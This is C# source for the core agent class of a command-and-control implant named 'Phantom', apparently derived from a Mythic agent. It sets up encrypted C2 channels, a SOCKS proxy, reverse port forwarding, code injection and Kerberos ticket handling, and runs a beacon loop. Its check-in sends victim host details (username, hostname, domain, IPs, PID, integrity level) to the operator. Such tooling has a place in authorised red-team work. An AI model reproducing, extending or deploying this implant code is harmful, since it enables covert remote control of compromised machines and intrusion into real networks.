using System;
using System.Linq;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using AM = Phantom.Management;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Collections.Generic;

namespace Phantom.Agent
{
    public class Phantom : PhantomInterop.Classes.Agent
    {

        public Phantom(string uuid) : base(uuid)
        {
            Api = new Api.Api();
            CommHandler = new AM.C2.CommHandler(this);
            NodeHandler = new AM.Peer.NodeHandler(this);
            ProxyHandler = new AM.Socks.ProxyHandler(this);
            TunnelHandler = new AM.Rpfwd.TunnelHandler(this);
            CommandProcessor = new AM.Tasks.CommandProcessor(this);
            DataHandler = new AM.Files.DataHandler(this);
            UserContext = new AM.Identity.UserContext(this);
            ProcHandler = new Process.ProcHandler(this);
            CodeInjector = new Injection.CodeInjector(this);
            TicketManager = new KerberosTickets.TicketHandler(this);
            

            foreach (string profileName in Settings.CommProfiles.Keys)
            {
                var map = Settings.CommProfiles[profileName];

                var crypto = CreateType(map.TCryptography, new object[] { Settings.AgentIdentifier, Settings.CryptoKey });
                var serializer = CreateType(map.TSerializer, new object[] { crypto });
                var c2 = CreateType(map.TC2Profile, new object[]
                {
                    map.Parameters,
                    (ISerializer)serializer,
                    this
                });

                CommHandler.AddEgress((IC2Profile)c2);
            }

            if (CommHandler.GetEgressCollection().Length == 0)
            {
                throw new Exception("No egress profiles specified.");
            }

            foreach (string profileName in Config.IngressProfiles.Keys)
            {
                var map = Settings.CommProfiles[profileName];

                var crypto = CreateType(map.TCryptography, new object[] { Settings.AgentIdentifier, Settings.CryptoKey });
                var serializer = CreateType(map.TSerializer, new object[] { crypto });
                var c2 = CreateType(map.TC2Profile, new object[]
                {
                    map.Parameters,
                    (ISerializer)serializer,
                    this
                });

                CommHandler.AddIngress((IC2Profile)c2);
            }
        }

        public override void Start()
        {
            while (Alive)
            {
                if (Checkin())
                {
                    IC2Profile[] c2s = CommHandler.GetConnectedEgressCollection();
                    foreach(var c2 in c2s)
                    {
                        c2.Start();
                    }
                }
                System.Threading.Thread.Sleep(1000);
            }
        }

        private static string[] GetIPs()
        {
            var ifaces = NetworkInterface.GetAllNetworkInterfaces()
                .Where(iface =>
                    iface.OperationalStatus == OperationalStatus.Up && iface.NetworkInterfaceType != NetworkInterfaceType.Loopback
                )
                .OrderBy(iface => iface.GetIPProperties().GatewayAddresses.ToArray().Length); // Push interfaces with a gateway to the front

            var ipaddrs = new List<string>();
            foreach (var iface in ifaces)
            {
                var addrs = iface.GetIPProperties().UnicastAddresses;

                // Put the IPv4 addresses before the IPv6 addresses
                ipaddrs.AddRange(
                    addrs.Where(addr => addr.Address.AddressFamily == AddressFamily.InterNetwork)
                    .Select(addr => addr.Address.ToString())
                );

                ipaddrs.AddRange(
                    addrs.Where(addr => addr.Address.AddressFamily == AddressFamily.InterNetworkV6)
                    .Select(addr => addr.Address.ToString())
                );
            }

            return [.. ipaddrs];
        }

        private static string GetOSVersion()
        {
            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "");
        }

        private bool Checkin()
        {
            CheckinMessage msg = new CheckinMessage()
            {
                Action = "checkin",
                OS = $"{GetOSVersion()} {Environment.OSVersion.Version}",
                User = Environment.UserName,
                Host = Dns.GetHostName(),
                PID = System.Diagnostics.Process.GetCurrentProcess().Id,
                ProcessName = System.Diagnostics.Process.GetCurrentProcess().ProcessName,
                IPs = GetIPs(),
                UUID = UUID,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                Domain = Environment.UserDomainName,
                // Modify this later.
                IntegrityLevel = UserContext.GetIntegrityLevel(),
                ExternalIP = "",
            };
            IC2Profile connectProfile = null;
            bool bRet = false;
            foreach(var profile in CommHandler.GetEgressCollection())
            {
                try
                {
                    if (profile.Connect(msg, delegate (MessageResponse r)
                    {
                        connectProfile = profile;
                        UUID = r.ID;
                        bRet = true;
                        return bRet;
                    }))
                    {
                        break;
                    }
                } catch(Exception ex)
                {
                    
                }
            }
            return bRet;

        }

        private object CreateType(Type t, object[] args)
        {
            var ctors = t.GetConstructors();
            return ctors[0].Invoke(args);
        }

        public override void Exit()
        {
            base.Exit();
        }
    }
}
